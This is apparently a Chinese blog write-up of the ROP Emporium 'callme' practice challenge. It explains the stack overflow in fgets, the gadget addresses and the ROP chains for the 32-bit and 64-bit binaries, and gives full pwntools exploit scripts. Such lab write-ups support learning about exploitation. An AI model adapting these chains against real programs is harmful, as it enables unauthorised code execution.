---
title: ROP Emporium の callme
date: 2020-05-29 14:37:20
categories: 
- WriteUPs
- ROP Emporium
tags: 
- PWN
- ROP
- Stack
---
## Introduction

&emsp;&emsp;[ROP Emporium](https://ropemporium.com)训练2：callme的解析。

<!-- more -->

## callme32

### Step 1

&emsp;&emsp;程序正常运行截图：

![](/img/callme/callme1.png)

&emsp;&emsp;checksec：32位程序，依然只开启了DEP保护

![](/img/callme/callme2.png)

### Step 2

&emsp;&emsp;还是一样的把程序丢到hopper中分析，首先是callme32主程序。

&emsp;&emsp;可以找到有pwnme函数中fgets函数依然存在溢出漏洞，但是程序中找不到system函数，多了3个callme函数。

![](/img/callme/callme3.png)

&emsp;&emsp;具体看了一下这三个callme函数发现都是去调用libc.so中的对应函数，所以我们去看下题目给的libcallme32.so文件中对应的3个函数具体内容：

![callme_one](/img/callme/callme4.png)

![callme_two](/img/callme/callme5.png)

![callme_three](/img/callme/callme6.png)

&emsp;&emsp;结合题目给的提示：

![](/img/callme/callme7.png)

&emsp;&emsp;所以我们需要控制程序依次调用callme_one，callme_two，callme_three三个函数，且每次传入的参数均为1，2，3。

### Step 3

&emsp;&emsp;确定了思路我们就开始按照思路一步一步往下走。

&emsp;&emsp;首先覆盖fegts函数返回地址为callme_one函数地址，并给出3个运行参数1，2，3。为了实现再次控制栈，我们需要恢复栈实现堆栈平衡。

&emsp;&emsp;我们输入了3个参数，所以我们需要3个pop指令+ret指令，找一下程序中这样的段：

![](/img/callme/callme8.png)

&emsp;&emsp;0x080488a9这个地址的指令是满足条件的，所以我们就可以覆盖fgets函数返回地址调用callme_one函数，然后覆盖调用callme_one函数后的返回地址为我们找到的pop+pop+pop+ret指令保持堆栈平衡。

&emsp;&emsp;然后控制ret返回地址为callme_two函数入口，再次调用pop*3+ret的结构恢复堆栈平衡，然后控制ret跳转到callme_three函数入口......

&emsp;&emsp;就这样玩着套娃游戏就可以解决这道题。

### Appendix

&emsp;&emsp;直接贴上EXP脚本：

```Python
* from pwn import *
* 
* sh = process('./callme32')
* elf = ELF('./callme32')
* 
* one_addr = elf.symbols['callme_one']
* two_addr = elf.symbols['callme_two']
* thr_addr = elf.symbols['callme_three']
* 
* rop_addr = 0x080488a9
* 
* payload_start = 'a' * (0x28 + 0x4)
* payload_one = p32(one_addr) + p32(rop_addr) + p32(1) + p32(2) + p32(3)
* payload_two = p32(two_addr) + p32(rop_addr) + p32(1) + p32(2) + p32(3)
* payload_thr = p32(thr_addr) + p32(0xdeedbeef) + p32(1) + p32(2) + p32(3)
* 
* payload = payload_start + payload_one + payload_two + payload_thr
* 
* sh.recvuntil('>')
* sh.sendline(payload)
* 
* sh.interactive()
* sh.close()
```

&emsp;&emsp;脚本运行成功截图：

![](/img/callme/callme9.png)

## callme

### Step 1

&emsp;&emsp;程序运行以及checksec和32位程序一模一样，只是换成了64位程序，我们需要考虑下传参方式带来的问题。

### Step 2

&emsp;&emsp;在运行64位程序的时候程序会从相应寄存器中读取参数，所以调用函数之前需要先将数据传到寄存器中去。本题中需要传入3个参数，所以我们需要找到一个这样的指令结构：

```Code
* pop rdi
* pop rsi
* pop rdx
* ret
```

&emsp;&emsp;通过ROPgadget找到0x401ab0的位置有满足条件的结构：

![](/img/callme/callme10.png)

&emsp;&emsp;于是每次调用函数的套娃型payload的结构就变成了：payload = rop_addr + 参数1 + 参数2 + 参数3 + func_addr

### Step 3

&emsp;&emsp;直接给出EXP脚本：

```Python
* from pwn import *
* 
* sh = process('./callme')
* elf = ELF('./callme')
* 
* one_addr = elf.symbols['callme_one']
* two_addr = elf.symbols['callme_two']
* thr_addr = elf.symbols['callme_three']
* 
* rop_addr = 0x401ab0
* 
* payload_start = 'a' * (0x20 + 0x8)
* payload_one = p64(rop_addr) + p64(1) + p64(2) + p64(3) + p64(one_addr)
* payload_two = p64(rop_addr) + p64(1) + p64(2) + p64(3) + p64(two_addr)
* payload_thr = p64(rop_addr) + p64(1) + p64(2) + p64(3) + p64(thr_addr)
* 
* payload = payload_start + payload_one + payload_two + payload_thr
* 
* sh.recvuntil('>')
* sh.sendline(payload)
* 
* sh.interactive()
* sh.close()
```

&emsp;&emsp;脚本运行成功截图：

![](/img/callme/callme11.png)